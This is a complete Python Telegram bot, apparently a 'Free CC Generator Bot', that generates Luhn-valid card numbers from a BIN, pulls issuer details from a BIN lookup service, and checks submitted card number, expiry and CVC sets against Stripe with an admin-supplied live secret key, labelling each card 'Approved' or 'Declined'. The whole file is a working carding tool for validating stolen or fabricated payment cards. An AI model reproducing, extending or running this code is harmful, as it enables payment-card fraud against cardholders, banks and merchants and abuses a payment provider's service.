import os
import random
import re
import asyncio
import aiohttp
import stripe
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from aiohttp import web

TOKEN = os.getenv("TELEGRAM_TOKEN")
STRIPE_KEY = None  # Global variable for storing Stripe API key
ADMIN_ID = 6972264549  # Admin ID for restricted commands

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    return await response.json()
    except Exception as e:
        print(f"BIN API Error: {e}")
    return None

def luhn_check(card_number):
    digits = [int(d) for d in str(card_number)]
    checksum = 0
    reverse_digits = digits[::-1]
    for i, digit in enumerate(reverse_digits):
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        checksum += digit
    return checksum % 10 == 0

def generate_luhn_card(bin_number):
    while True:
        card_number = bin_number + ''.join(str(random.randint(0, 9)) for _ in range(16 - len(bin_number)))
        if luhn_check(card_number):
            return card_number

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.message.from_user.first_name
    welcome_message = f"Welcome, {user_name}! 🚀\n\nThis is the Free CC Generator Bot.\n\nEnjoy!"
    await update.message.reply_text(welcome_message)

async def add_sk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STRIPE_KEY
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to set the Stripe API key!")
        return
    if not context.args:
        await update.message.reply_text("❌ EXAMPLE: /addsk sk_live_xxx")
        return
    STRIPE_KEY = context.args[0]
    await update.message.reply_text("✅ Stripe API Key Set Successfully!")

async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global STRIPE_KEY
    print(f"Received /chk command from: {update.message.from_user.username} (ID: {update.message.from_user.id})")
    
    if STRIPE_KEY is None:
        await update.message.reply_text("❌ No Stripe API key found! Admin needs to add it using /addsk")
        return

    args = context.args
    if len(args) < 1 or not re.match(r"^\d{16}\|\d{2}\|\d{2}\|\d{3}$", args[0]):
        await update.message.reply_text("❌ Invalid format!\n**Example:** `/chk 4242424242424242|12|25|123`")
        return

    card_details = args[0].split('|')
    bin_number = card_details[0][:6]

    stripe.api_key = STRIPE_KEY
    bin_info = await get_bin_info(bin_number) or {"vendor": "Unknown", "type": "Unknown", "country_name": "Unknown", "bank": "Unknown"}

    try:
        token = stripe.Token.create(
            card={
                "number": card_details[0],
                "exp_month": int(card_details[1]),
                "exp_year": int(card_details[2]),
                "cvc": card_details[3]
            }
        )
        status = "✅ Approved"
        response_message = "Transaction Successful."
        gateway = "Stripe"
    except stripe.error.CardError as e:
        status = "❌ Declined"
        response_message = e.user_message or "Your card was declined."
        gateway = "Stripe Auth"
    except stripe.error.APIConnectionError:
        await update.message.reply_text("⚠️ Stripe API connection failed. Please try again later.")
        return
    except Exception as e:
        await update.message.reply_text(f"⚠️ Unexpected error: {str(e)}")
        return

    message = (
        f"🔥 **Stripe Auth** (`/chk`) | Free\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💳 **Card:** `{args[0]}`\n"
        f"📌 **Status:** {status}\n"
        f"📢 **Response:** {response_message}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"💲 **Gateway:** {gateway}\n"
        f"🏦 **Issuer:** {bin_info.get('bank', 'Unknown')}\n"
        f"🌍 **Country:** {bin_info.get('country_name', 'Unknown')}\n"
        f"🔖 **Type:** {bin_info.get('type', 'Unknown')}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Checked by:** @{update.message.from_user.username}"
    )
    await update.message.reply_text(message, parse_mode="Markdown")

async def health_check(request):
    return web.Response(text="OK")

async def run_services():
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addsk", add_sk))
    application.add_handler(CommandHandler("chk", check_card))
    
    app = web.Application()
    app.router.add_get("/", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, port=8080)
    await site.start()

    await application.initialize()
    await application.start()
    await application.updater.start_polling()

    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(run_services())
